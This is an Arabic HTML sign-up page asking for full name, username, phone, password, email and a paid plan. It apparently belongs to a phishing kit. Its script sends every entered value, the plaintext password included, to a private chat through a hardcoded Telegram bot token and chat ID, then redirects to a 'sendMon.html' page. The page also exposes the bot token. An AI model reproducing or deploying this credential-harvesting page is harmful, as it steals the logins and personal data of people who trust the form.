<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل حساب جديد</title>
  <style>
  
    /* Font Face for TTF */
        @font-face {
            font-family: 'arabic';
            src: url('arabic.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        /* Font for entire page */
        * {
            font-family: 'arabic', sans-serif;
    body {
      
      background: linear-gradient(135deg, #1e3c72, #2a5298, #3b5998);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      color: #fff;
      
    }
    .container {
      background: rgba(255, 255, 255, 0.1);
      padding: 40px;
      border-radius: 25px;
      width: 420px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    h2 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 32px;
      font-weight: 700;
      color: #fff;
      text-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
    }
    .back-btn {
      display: inline-block;
      margin-bottom: 25px;
      color: #fff;
      text-decoration: none;
      background: rgba(255, 255, 255, 0.15);
      padding: 10px 20px;
      border-radius: 12px;
      transition: all 0.3s ease;
    }
    .back-btn:hover {
      background: rgba(255, 255, 255, 0.25);
      transform: translateX(-5px);
    }
    .field {
      margin-bottom: 25px;
      position: relative;
    }
    label {
      display: block;
      font-size: 15px;
      margin-bottom: 8px;
      color: #e0e0e0;
      font-weight: 400;
    }
    .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
      transition: all 0.3s ease;
    }
    input, select {
      width: 100%;
      padding: 14px 14px 14px 45px;
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      font-size: 15px;
      transition: all 0.3s ease;
      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.1);
    }
    input:focus, select:focus {
      outline: none;
      border-color: #00c4cc;
      background: rgba(255, 255, 255, 0.1);
      box-shadow: 0 0 15px rgba(0, 196, 204, 0.5), inset 0 2px 5px rgba(0, 0, 0, 0.1);
      transform: scale(1.02);
    }
    input::placeholder {
      color: #b0b0b0;
      font-weight: 400;
    }
    svg {
      position: absolute;
      left: 15px;
      width: 22px;
      height: 22px;
      fill: #00c4cc;
      transition: fill 0.3s ease;
    }
    input:focus + svg, select:focus + svg {
      fill: #fff;
    }
    button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #00c4cc, #007b83);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 196, 204, 0.4);
    }
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(0, 196, 204, 0.6);
      background: linear-gradient(135deg, #00e0e8, #009ca3);
    }
    button:active {
      transform: translateY(0);
      box-shadow: 0 3px 10px rgba(0, 196, 204, 0.3);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .field {
      animation: fadeIn 0.5s ease forwards;
      animation-delay: calc(var(--i) * 0.1s);
      opacity: 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <a class="back-btn" href="index.html">عودة إلى تسجيل الدخول</a>
    <h2>تسجيل حساب جديد</h2>
    <div class="field" style="--i: 1">
      <label for="fullname">الاسم الكامل</label>
      <div class="input-wrapper">
        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
        <input type="text" id="fullname" placeholder="أدخل اسمك الكامل" required>
      </div>
    </div>
    <div class="field" style="--i: 2">
      <label for="username">اسم المستخدم</label>
      <div class="input-wrapper">
        <svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 00-5 5c0 2.76 2.24 5 5 5s5-2.24 5-5a5 5 0 00-5-5zm0 12c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/></svg>
        <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
      </div>
    </div>
    <div class="field" style="--i: 3">
      <label for="phone">رقم الهاتف</label>
      <div class="input-wrapper">
        <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.91 15.91 0 006.59 6.59l2.2-2.2a1 1 0 011.41-.13c.79.39 1.65.63 2.58.63a1 1 0 011 1v3.5a1 1 0 01-1 1C9.07 22 2 14.93 2 6.5a1 1 0 011-1h3.5a1 1 0 011 1c0 .93.24 1.79.63 2.58a1 1 0 01-.13 1.41l-2.2 2.2z"/></svg>
        <input type="text" id="phone" placeholder="أدخل رقم هاتفك" required>
      </div>
    </div>
    <div class="field" style="--i: 4">
      <label for="password">كلمة المرور</label>
      <div class="input-wrapper">
        <svg viewBox="0 0 24 24"><path d="M12 17a2 2 0 100-4 2 2 0 000 4zm6-9a2 2 0 00-2-2H8a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V8z"/></svg>
        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
      </div>
    </div>
    <div class="field" style="--i: 5">
      <label for="email">البريد الإلكتروني</label>
      <div class="input-wrapper">
        <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V6a2 2 0 00-2-2zm-1 2.59l-7 4.67-7-4.67V6h14v.59z"/></svg>
        <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
      </div>
    </div>
    <div class="field" style="--i: 6">
      <label for="plan">اختر الباقة</label>
      <div class="input-wrapper">
        <svg viewBox="0 0 24 24"><path d="M21 5H3a2 2 0 00-2 2v10a2 2 0 002 2h18a2 2 0 002-2V7a2 2 0 00-2-2zM9 15H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z"/></svg>
        <select id="plan" required>
          <option value="">اختر باقتك</option>
          <option value="€0.99">الباقة الأولى - €0.99</option>
          <option value="€4.99">الباقة المتوسطة - €4.99</option>
          <option value="€9.99">الباقة الكاملة - €9.99</option>
        </select>
      </div>
    </div>
    <button onclick="register()">تسجيل الآن</button>
  </div>

  <script>
    function register() {
      let fullname = document.getElementById('fullname').value.trim();
      let username = document.getElementById('username').value.trim();
      let phone = document.getElementById('phone').value.trim();
      let password = document.getElementById('password').value.trim();
      let email = document.getElementById('email').value.trim();
      let plan = document.getElementById('plan').value;

      if (!fullname || !username || !phone || !password || !email || !plan) {
        alert('يرجى ملء جميع الحقول');
        return;
      }

      let message = `مسجل جديد:\nالاسم: ${fullname}\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}\nكلمة المرور: ${password}\nالبريد الإلكتروني: ${email}\nالباقة المختارة: ${plan}`;

      let chatId = "6431271423";
      let token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .then(res => res.json())
      .then(data => {
        console.log("تم إرسال التسجيل إلى تيليجرام", data);
        window.location.href = "sendMon.html";
      })
      .catch(error => {
        console.error("خطأ في إرسال البيانات", error);
        alert('حدث خطأ أثناء الإرسال. حاول مرة أخرى.');
      });
    }
  </script>
</body>
</html>
